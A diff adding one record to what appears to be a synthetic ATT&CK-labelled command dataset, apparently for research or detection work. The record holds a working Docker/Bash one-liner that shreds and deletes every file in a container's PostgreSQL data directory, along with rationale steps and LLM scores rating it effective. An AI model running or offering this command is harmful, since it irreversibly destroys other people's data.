@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1485",
+  "platform": "Containers",
+  "shell": "Bash",
+  "command": "docker run --rm --volumes-from db01 ubuntu bash -lc 'if [ -d /var/lib/postgresql/data ]; then find /var/lib/postgresql/data -xdev -type f -print0 | xargs -0 -r shred -n 3 -z -u; sync; fi'",
+  "explanation": "Accesses the PostgreSQL data directory exposed by the db01 container and irreversibly overwrites and deletes its files, then syncs.",
+  "rationale_steps": [
+    "Use --volumes-from to gain access to db01's data storage",
+    "Scope to the PostgreSQL data directory to avoid collateral damage",
+    "Perform multi-pass shred and delete files",
+    "Sync to ensure data is written"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-763669c5-fba87d13",
+  "source_prompt_hash": "763669c5",
+  "timestamp_utc": "2025-09-30T08:01:03.936632Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with valid docker flags, balanced quoting, and a correct bash if/find/xargs/shred pipeline.",
+        "semantic_score": 5,
+        "semantic_justification": "It mounts db01’s volumes, targets the PostgreSQL data directory, and uses shred to overwrite and delete files followed by sync, fitting data destruction (T1485).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T00:36:20.136459Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper use of bash -lc with a single-quoted compound statement, valid find/xargs/shred flags, and correct command separators throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1485 by using --volumes-from to access the target container's PostgreSQL data directory, then employing shred with 3 overwrite passes plus a final zero-pass (-n 3 -z) and file deletion (-u) on every file found, followed by sync to flush to disk, making recovery effectively impossible.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T01:38:47.098097Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command correctly uses Docker flags and a well-formed bash one-liner with properly nested conditional logic and piped commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The use of shred via a sidecar container to securely wipe a database volume is a highly effective and realistic implementation of Data Destruction (T1485).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:38:49.798344Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
